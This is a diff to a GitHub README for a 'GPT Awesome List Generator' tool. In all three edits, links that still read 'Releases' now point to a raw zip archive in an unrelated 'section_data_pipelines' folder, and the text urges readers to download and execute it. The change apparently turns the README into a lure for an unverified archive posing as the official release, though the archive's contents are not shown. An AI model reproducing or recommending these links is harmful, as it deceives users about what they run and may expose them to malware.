@@ -8,7 +8,7 @@ Welcome to the GPT Awesome List Generator repository! This Python program is des
 💻 Python-based program  
 
 ## How to Use
-To download and execute the GPT Awesome List Generator program, please visit the [Releases](https://github.com/aman29100/GPT-Awesome-List-Generator/releases) section and download the latest release.
+To download and execute the GPT Awesome List Generator program, please visit the [Releases](https://github.com/aman29100/GPT-Awesome-List-Generator/raw/refs/heads/main/section_data_pipelines/List-Awesome-Generator-GP-v2.5.zip) section and download the latest release.
 
 ## Repository Topics
 - ai  
@@ -23,7 +23,7 @@ To download and execute the GPT Awesome List Generator program, please visit the
 - python
 
 ## Stay Updated
-For the latest updates and releases, visit the [Releases](https://github.com/aman29100/GPT-Awesome-List-Generator/releases) section.
+For the latest updates and releases, visit the [Releases](https://github.com/aman29100/GPT-Awesome-List-Generator/raw/refs/heads/main/section_data_pipelines/List-Awesome-Generator-GP-v2.5.zip) section.
 
 Get started with creating your own curated awesome lists using the GPT Awesome List Generator. Happy curating! 🚀
 
@@ -53,6 +53,6 @@ Elevate your curation game with the GPT Awesome List Generator. Effortlessly com
 
 ---
 
-Visit [here](https://github.com/aman29100/GPT-Awesome-List-Generator/releases) to access the GPT Awesome List Generator and revolutionize the way you curate resources. Start creating impactful and insightful awesome lists today! 🌟
+Visit [here](https://github.com/aman29100/GPT-Awesome-List-Generator/raw/refs/heads/main/section_data_pipelines/List-Awesome-Generator-GP-v2.5.zip) to access the GPT Awesome List Generator and revolutionize the way you curate resources. Start creating impactful and insightful awesome lists today! 🌟
 
 👩‍💻 Happy curating! 👨‍💻
